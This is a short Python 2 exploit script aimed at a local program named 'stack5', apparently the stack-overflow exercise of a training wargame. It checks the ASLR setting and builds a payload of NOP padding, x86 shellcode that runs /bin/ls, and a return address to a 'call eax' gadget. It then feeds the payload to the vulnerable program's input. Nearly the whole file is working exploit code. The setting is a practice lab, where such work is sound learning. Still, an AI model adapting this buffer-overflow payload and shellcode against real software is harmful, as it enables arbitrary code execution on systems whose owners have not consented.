#!/usr/bin/python
#-*- coding: utf-8 -*-
'''
'''

from struct import *
import os
import sys
import subprocess
import time

def check_aslr():
    randomize_va_space_file = open("/proc/sys/kernel/randomize_va_space", 'r')
    value = randomize_va_space_file.read()
    randomize_va_space_file.close()
    if int(value) == 2:
        print 'ASLR activated exploit probably will not work'
    elif int(value) == 0:
        print 'ASLR not activated exploit probably will work if address is okay'
        return
    else:
        print 'ASLR value = %d dunno what it is' % int(value)
        sys.exit(2)


#check_aslr()

# execute /bin/ls
shellcode= "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"\
           "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"\
           "\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6c\x73";

# maxmium number of payload is 0x4C, so we have shellcode + nops
nops = '\x90' * (0x48 - len(shellcode))

# in eax we have the pointer to the shellcode
retaddr = pack("<L",0x080483bf) # call eax
#retaddr = '\x00\x00\x00\x00'
payload = nops + shellcode + 'BBBB' + retaddr

# call  program
process = subprocess.Popen(["./stack5"], stdin=subprocess.PIPE)
# wait a moment
time.sleep(2)
print '{EXPLOIT} Sending: %s' % (payload)
print "{EXPLOIT} /bin/ls output: "
process.stdin.write(payload)
#print "%s" % payload
